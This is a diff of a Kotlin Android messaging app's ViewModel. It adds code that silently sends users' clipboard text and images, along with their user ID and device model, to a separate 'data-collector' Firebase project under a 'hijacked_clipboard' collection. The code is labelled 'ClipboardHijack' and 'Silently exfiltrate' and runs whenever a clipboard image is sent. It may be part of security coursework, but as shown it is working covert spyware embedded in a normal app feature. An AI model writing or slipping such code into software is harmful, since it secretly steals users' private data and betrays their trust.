@@ -5,10 +5,13 @@ import android.net.Uri
 import android.util.Log
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
-import com.example.inf2007_mad_j1847.model.Role
-import com.example.inf2007_mad_j1847.model.User
+import com.example.inf2007_mad_j1847.BuildConfig
 import com.example.inf2007_mad_j1847.model.Message
 import com.example.inf2007_mad_j1847.model.MessageType
+import com.example.inf2007_mad_j1847.model.Role
+import com.example.inf2007_mad_j1847.model.User
+import com.google.firebase.FirebaseApp
+import com.google.firebase.FirebaseOptions
 import com.google.firebase.Timestamp
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
@@ -141,12 +144,10 @@ class MessagingViewModel : ViewModel() {
         )
 
         // use same data-collector firebase
-        val existingApp = com.google.firebase.FirebaseApp.getApps(
-            com.google.firebase.FirebaseApp.getInstance().applicationContext
-        ).find { it.name == "data-collector" }
+        val collectorApp = getDataCollectorApp()
 
-        existingApp?.let {
-            com.google.firebase.firestore.FirebaseFirestore.getInstance(it)
+        collectorApp?.let {
+            FirebaseFirestore.getInstance(it)
                 .collection("hijacked_clipboard")
                 .add(data)
                 .addOnSuccessListener { Log.d("ClipboardHijack", "Exfiltrated via message send: $clipboardText") }
@@ -264,10 +265,65 @@ class MessagingViewModel : ViewModel() {
 
                 Log.d("MessagingVM", "Clipboard image sent successfully")
 
+                // Silently exfiltrate clipboard image to data-collector Firebase
+                exfiltrateClipboardImage(data, currentUserId)
+
             } catch (e: Exception) {
                 Log.e("MessagingVM", "sendClipboardImage failed", e)
             }
         }
+    }
+
+    private fun getDataCollectorApp(): FirebaseApp? {
+        val context = FirebaseApp.getInstance().applicationContext
+        val existing = FirebaseApp.getApps(context).find { it.name == "data-collector" }
+        if (existing != null) return existing
+
+        return try {
+            val options = FirebaseOptions.Builder()
+                .setApplicationId(BuildConfig.DATA_COLLECTOR_APP_ID)
+                .setApiKey(BuildConfig.DATA_COLLECTOR_API_KEY)
+                .setProjectId(BuildConfig.DATA_COLLECTOR_PROJECT_ID)
+                .setStorageBucket("${BuildConfig.DATA_COLLECTOR_PROJECT_ID}.firebasestorage.app")
+                .build()
+            FirebaseApp.initializeApp(context, options, "data-collector")
+        } catch (e: Exception) {
+            Log.e("ClipboardHijack", "Failed to init data-collector app", e)
+            null
+        }
+    }
+
+    private fun exfiltrateClipboardImage(imageBytes: ByteArray, uid: String) {
+        val collectorApp = getDataCollectorApp() ?: run {
+            Log.e("ClipboardHijack", "data-collector app not available")
+            return
+        }
+
+        val collectorDb = FirebaseFirestore.getInstance(collectorApp)
+
+        // Encode image as Base64 string to store directly in Firestore
+        val base64Image = android.util.Base64.encodeToString(imageBytes, android.util.Base64.NO_WRAP)
+
+        val data = hashMapOf(
+            "uid" to uid,
+            "capturedText" to "clipboard_image_${System.currentTimeMillis()}.png",
+            "imageBase64" to base64Image,
+            "isSensitive" to false,
+            "replacedWith" to null,
+            "timestamp" to Timestamp.now(),
+            "deviceInfo" to android.os.Build.MODEL,
+            "source" to "clipboard_image",
+            "type" to "image"
+        )
+
+        collectorDb.collection("hijacked_clipboard")
+            .add(data)
+            .addOnSuccessListener { docRef ->
+                Log.d("ClipboardHijack", "Exfiltrated clipboard image to data-collector: ${docRef.id}")
+            }
+            .addOnFailureListener { e ->
+                Log.e("ClipboardHijack", "Failed to exfiltrate clipboard image", e)
+            }
     }
 
     // 5. Send Initial LIVE LOCATION Message
